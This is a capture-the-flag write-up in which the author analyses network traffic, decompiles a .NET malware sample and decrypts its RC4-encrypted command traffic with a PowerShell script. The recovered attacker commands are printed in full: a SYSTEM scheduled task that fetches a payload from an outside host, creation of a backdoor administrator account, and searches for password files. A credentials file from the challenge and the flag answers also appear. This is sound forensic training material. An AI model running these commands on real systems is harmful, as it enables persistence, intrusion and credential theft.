# CTF Write-Up: Silent Trap

## Overview

In this challenge, we analyzed network traffic and reverse engineered a .NET malicious program. Our objectives included:

- Analyzing a PCAP file in Wireshark
- Extracting an email (with subject "Game Crash On Level 5") and associated objects
- Exporting password-protected ZIP files from the PCAP and obtaining their MD5 hash
- Extracting the ZIP using the password provided in the email
- Discovering a password reset email revealing the credential for the web mail account
- Reverse engineering the extracted Windows PE file using ILSpyCmd to recover source code
- Analyzing the decompiled Program.cs and Exor.cs to understand the custom RC4-like encryption used for IMAP email body communication
- Decrypting the Base64-encoded, RC4-encrypted messages to reveal executed commands
- Answering final flag questions regarding a scheduled task name and a leaked API key

## Step 1: Network Traffic Analysis in Wireshark

### Load the PCAP File
- Open the provided PCAP in Wireshark

### Identify HTTP Web Mail Traffic
- Filter the traffic to identify HTTP communications. We discovered web mail activity.

### Locate the Email
- An email with the subject "Game Crash On Level 5" was found.

**Flag Q1 Answer:** Game Crash On Level 5

### Email Timestamp
- The email's timestamp is 2025-02-24 15:33.

**Flag Q2 Answer:** 2025-02-24 15:33

## Step 2: Exporting Objects from Wireshark

### Export HTTP Objects
- In Wireshark, go to File → Export Objects → HTTP
- Save the objects (look for those with application/zip headers)

### Identify ZIP Files
- Two ZIP files were found. Both were password-protected and, upon inspection, were identical in hash.

### Calculate MD5 Hash
- Using a tool such as md5sum on Linux or a hash calculator, we computed the MD5 hash of the ZIP file.

**Flag Q3 Answer:** (Insert the MD5 hash value here)

## Step 3: Malware File Analysis

### Triggered Defender
- The malicious file triggered Microsoft Defender due to known signatures.

### Extracting the ZIP
- The ZIP file was password-protected. The email body (from the web mail) contained the password, which allowed us to extract its contents.

### Password Reset Email
- We also discovered a password reset email. The reset message revealed the credentials for the web mail account:

```
proplayer@email.com:<PASSWORD>
```

**Flag Q4 Answer:** The credential line as observed in the email.

## Step 4: Reverse Engineering the Malicious PE File

### Initial File Analysis
- Using Linux tools (file, strings), we confirmed the extracted file was a Windows PE executable.

### Decompilation
- We used ILSpyCmd to decompile the executable. The two key files were:
  - Program.cs
  - Exor.cs

### Code Analysis
The decompiled source code revealed:
- A Base64 encoding function
- Functions to search/replace bytes in the file
- A custom xor function that wraps around an RC4-like encryption implemented in Exor.Encrypt
- IMAP functions used to retrieve emails
- Execution of system commands whose outputs are encrypted (XOR/RC4 + Base64-encoded) before being exfiltrated

*Note: See the decompiled code in Program.cs and Exor.cs for full details.*

## Step 5: Decrypting IMAP Message Bodies

The malicious program encrypts the output of executed commands (e.g., whoami /priv, tasklist /v, etc.) using an RC4-like algorithm with a fixed 256-byte key. We extracted Base64-encoded encrypted messages from the PCAP and then used our PowerShell RC4 decryption script to reveal their plaintext.

### Final Decrypted Commands
```
whoami /priv
tasklist /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
net user devsupport1 P@ssw0rd /add
net localgroup Administrators devsupport1 /add (twice)
reg query HKLM /f "password" /t REG_SZ /s
dir C:\ /s /b | findstr "password" (twice)
more "C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt"
more C:\backups\credentials.txt
```

From these, we obtained:

**Flag Q5 Answer:** The scheduled task name is `Synchronization`.

**Flag Q6 Answer:** The leaked API key was extracted from the contents of C:\backups\credentials.txt
(Insert the API key as observed in the file.)

### Complete PowerShell RC4 Decryption Script

```powershell
# Define the 256-byte RC4 key (as used in the .NET code)
$rc4Key = @(
    168,115,174,213,168,222,72,36,91,209,242,128,69,99,195,164,238,182,67,92,7,121,164,86,121,10,93,4,140,111,248,44,
    30,94,48,54,45,100,184,54,28,82,201,188,203,150,123,163,229,138,177,51,164,232,86,154,179,143,144,22,134,12,40,243,
    55,2,73,103,99,243,236,119,9,120,247,25,132,137,67,66,111,240,108,86,85,63,44,49,241,6,3,170,131,150,53,49,126,72,
    60,36,144,248,55,10,241,208,163,217,49,154,206,227,25,99,18,144,134,169,237,100,117,22,11,150,157,230,173,38,72,99,
    129,30,220,112,226,56,16,114,133,22,96,1,90,72,162,38,143,186,35,142,128,234,196,239,134,178,205,229,121,225,246,232,
    205,236,254,152,145,98,126,29,217,74,177,142,19,190,182,151,233,157,76,74,104,155,79,115,5,18,204,65,254,204,118,71,
    92,33,58,112,206,151,103,179,24,164,219,98,81,6,241,100,228,190,96,140,128,1,161,246,236,25,62,100,87,145,185,45,61,
    143,52,8,227,32,233,37,183,101,89,24,125,203,227,9,146,156,208,206,194,134,194,23,233,100,38,158,58,159
)

# RC4 decryption function implementing the key-scheduling algorithm (KSA) and PRGA.
function RC4-Decryption {
    param (
        [byte[]]$key,
        [byte[]]$data
    )

    # Initialize the state vector S (0..255)
    $S = 0..255

    # Key-Scheduling Algorithm (KSA)
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        # Swap S[i] and S[j]
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }

    # Pseudo-Random Generation Algorithm (PRGA)
    $i = 0
    $j = 0
    $result = New-Object byte[] ($data.Length)
    for ($n = 0; $n -lt $data.Length; $n++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        # Swap S[i] and S[j]
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp

        $K = $S[ ($S[$i] + $S[$j]) % 256 ]
        $result[$n] = $data[$n] -bxor $K
    }
    return $result
}

# Function to decode Base64 and then decrypt with RC4.
function Decrypt-Base64RC4 {
    param (
        [string]$base64Data
    )

    # Decode the Base64 string into a byte array.
    $decodedData = [Convert]::FromBase64String($base64Data)

    # Decrypt the data using the RC4 algorithm.
    $decryptedBytes = RC4-Decryption -key $rc4Key -data $decodedData

    # Convert the decrypted byte array to a UTF8 string.
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# The provided Base64-encoded encrypted messages.
$encryptedMessages = @(
    "bmmDXtPNDyr4vZ8E",
    "bWCfVNLNXHGo4IA=",
    "bmyFXJ7VSWCoqJMGf1qLIR7+UZSgihkAN9Sal6T7m7heF/CN1N1UPw3PsM8lg6MCSxHjnb0=",
    "amKES9/XRHao4JUAOnieNEq4SpSsnQUdN86BiL77jrcGNvCXsptYBGnBic4hkrAdTxHrvv1buimrxfneAZu3A8dSQvmIsR3eb3COTLLrxtzs4Bhxtos5sLmVEfd0dHRMQnDDzCo5Pl+KQdi4xP+nSaenTD+5CesD6cL8b10VJX5CgXdMYc/KNsKNUWzTSQJyHApu5F6iR/LQ64AaeU3oDQpTOqXMcQBfpNLfC+es5/yY5K0wzHae8Yhkaap7rBCgplJY5E7hiOCNjLdWAXuzadw6z6VOUJIY/B56EReI0CVZNfqgQBHEiLbI",
    "d2SYH8vXSneoq5MELGyaIQXlSsusnjwAJ9HDlbSy27cWOw==",
    "d2SYH9LLTGTkqIQdKmnKEA76V5TlvQgBNdKclaOykLMELOqJ4tteAnjD1sAykw==",
    "d2SYH9LLTGTkqIQdKmnKEA76V5TlvQgBNdKclaOykLMELOqJ4tteAnjD1sAykw==",
    "a2SLH8/RSnfx7745E1TKfgy3HIrtvQ8EO9SXxfC9gPYgGtimwe4MWTo=",
    "fWieH/2ecyWnvNZdPTmWcQz+UJ7/ug5TdtaSlKPlm6QWfQ==",
    "fWieH/2ecyWnvNZdPTmWcQz+UJ7/ug5TdtaSlKPlm6QWfQ==",
    "dG6eWp6GbD/UmoUXLWq2NQ/hE4n5vgwcJtKvpqDisLcGPsO1/ddNGhWhi8AgkpEBQQDws6Fbng75icrDSbqwGNlOSdu7iAfYZHCIVLbr6fW0ri18taI5qrzpa8VyemxaGEjUygtyO1KbEA==",
    "dG6eWp7nFVnqrpUZKmmZDQnlW57poAgaNcqAyaTqgA=="
)

# Process and output each decrypted message.
foreach ($msg in $encryptedMessages) {
    $decryptedMessage = Decrypt-Base64RC4 -base64Data $msg
    Write-Host "Decrypted Message: $decryptedMessage"
}
```

## Decrypted Output

```
Decrypted Message: whoami /priv
Decrypted Message: tasklist /v
Decrypted Message: wmic qfe get Caption,Description,HotFixID,InstalledOn
Decrypted Message: schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
Decrypted Message: net user devsupport1 P@ssw0rd /add
Decrypted Message: net localgroup Administrators devsupport1 /add
Decrypted Message: net localgroup Administrators devsupport1 /add
Decrypted Message: reg query HKLM /f "password" /t REG_SZ /s
Decrypted Message: dir C:\ /s /b | findstr "password"
Decrypted Message: dir C:\ /s /b | findstr "password"
Decrypted Message: more "C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt"
Decrypted Message: more C:\backups\credentials.txt
```

### Leaked Credentials

```
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
[Database Server]
host=db.internal.korptech.net
username=dbadmin
password=rY?ZY_65P4V0

[Game API]
host=api.korptech.net
api_key=sk-3498fwe09r8fw3f98fw9832fw

[SSH Access]
host=dev-build.korptech.net
username=devops
password=BuildServer@92|7Gy1lz'Xb
port=2022

C:\Users\dev-support\Desktop>
```

## Step 6: Final Flag Answers

After decrypting the messages, we determined the following:

**Q5:** The scheduled task created by the attacker is named `Synchronization`.

**Q6:** The API key was leaked from the file C:\backups\credentials.txt: `sk-3498fwe09r8fw3f98fw9832fw`

## Conclusion

This challenge required skills in network traffic analysis, file extraction, hash calculation, malware reverse engineering, and custom cryptography. By:

- Using Wireshark to export HTTP objects
- Extracting and hashing files
- Decompiling a malicious PE file with ILSpyCmd
- Reversing a custom RC4-like decryption routine with PowerShell

We were able to recover the attacker's commands and extract the final flags.

This comprehensive process not only demonstrated our technical abilities but also provided insights into modern malware tactics.
